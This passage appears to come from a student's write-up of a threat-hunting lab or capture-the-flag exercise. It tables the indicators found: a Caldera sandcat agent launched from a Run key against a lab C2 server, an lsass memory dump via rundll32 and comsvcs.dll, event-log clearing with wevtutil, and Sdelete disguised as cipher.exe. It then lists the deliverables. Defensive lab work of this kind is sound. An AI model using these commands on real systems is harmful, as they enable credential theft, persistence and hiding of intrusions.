| Persistence | Run key<br>- Name: HotelSyncAgent<br>- Value: `C:\NulltackLab\sandcat.exe -server http://192.168.67.128:8888 -group red`<br><br>Scheduled task:<br>- MicrosoftEdgeSyncTask |
| Files | **Sandcat.exe**: caldera agent used by the attacker to establish persistence mechanisms<br><br>**HotelWiFi_Portal_Update.exe**: malicious executable was used to gain initial access<br>- Size: 171bytes<br><br>**rundll32.exe**: abused via comsvcs.dll MiniDump to dump lsass memory with<br><br>**exfil_bluebalance.zip**: archive contained collected files to exfiltrate<br>- size: 559 bytes<br><br>**wevtutil.exe**: was abused to clear the windows event logs via `wevtutil cl security`<br><br>**Sdelete64.exe**: masquerading as cipher.exe, was used to delete the collected files and overwrite the free space (previously occupied by the deleted files).<br>- SHA1: `12b08c7a6a36d5624c2d7f40784c26a3607fa89b`<br><br>Collected files for exfiltration:<br>- Executive_Travel_Itinerary.docx<br>- Q3_MnA_Confidential.xlsx<br>- VPN_Access.txt |
## Knowledge graph 
<img width="945" height="471" alt="image" src="https://github.com/user-attachments/assets/69f4d0de-c2a6-4141-831e-0e11b0da5a0a" /><br>
## Conclusion
All tasks were successfully performed and completed.
| Deliverable | Status |
|-------------|--------|
| Part 1 – Threat actor context | Delivered |
| Part 2 – Initial access | Delivered |
| Part 3 – Password spray | Delivered |
| Part 4 - Discovery | Delivered |
| Part 5 – Credential theft | Delivered |
| Part 6 – Persistence | Delivered |
| Part 7 – Exfiltration and evasion | Delivered |
| Part 8 – Correlation and report | Delivered |
| Part 9 – Nist framework and incident report | Delivered |
| Part 10 – Lesson learned | Delivered |
| CTF -Flag Summury | Delivered |
| Bonus challenge | Delivered |

























  

















